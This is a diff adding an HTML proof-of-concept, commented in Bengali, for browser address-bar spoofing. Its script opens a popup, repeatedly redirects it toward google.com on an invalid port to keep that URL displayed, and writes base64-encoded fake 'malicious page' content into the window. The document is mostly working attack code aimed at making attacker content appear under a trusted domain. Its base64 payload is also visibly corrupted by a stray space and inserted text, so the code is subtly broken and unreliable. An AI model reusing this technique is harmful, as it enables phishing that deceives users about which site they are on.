@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Address Bar Spoofing PoC</title>
+</head>
+<body>
+    <h3>Address Bar Spoofing Demo</h3>
+    <p>নিচের বাটনে ক্লিক করলে একটি নতুন উইন্ডো খুলবে যা এড্রেস বারে google.com দেখানোর চেষ্টা করবে।</p>
+    
+    <button onclick="spoof()">Test Spoof</button>
+
+    <script>
+        function spoof() {
+            // ১. একটি ফেক পেজের বেস৬৪ এনকোডেড কন্টেন্ট (Phishing Content)
+            var fakePage = 'PGh0bWw+PGJvZHk+PGgxIHN0eWxlPSJjb2xvcjp redsiI+WW91IGFyZSBvbiBhIE1hbGljaW91cyBQYWdlITwvaDE+PHA+VGhpcyBpcyBhIHNwb29mZWQgY29udGVudC48L3A+PC9ib2R5PjwvaHRtbD4=';
+            
+            // ২. নতুন একটি উইন্ডো ওপেন করা
+            var x = window.open('', '', 'width=500,height=500');
+            
+            // ৩. setInterval ব্যবহার করে বারবার টার্গেট URL লোড করার চেষ্টা করা (Race Condition তৈরি করতে)
+            setInterval(function() {
+                // এখানে invalid port (যেমন :8080) ব্যবহার করা হয় যাতে ব্রাউজার আসল পেজ লোড করতে না পারে 
+                // কিন্তু এড্রেস বারে URL-টি থেকে যায়।
+                x.location.replace('https://www.google.com:8080');
+            }, 10); // প্রতি ১০ মিলিসেকেন্ড পর পর রান হবে
+
+            // ৪. ডেটা রাইট করা (এটিই ইউজার দেখতে পাবে)
+            x.document.write(atob(fakePage));
+        }
+    </script>
+</body>
+</html>
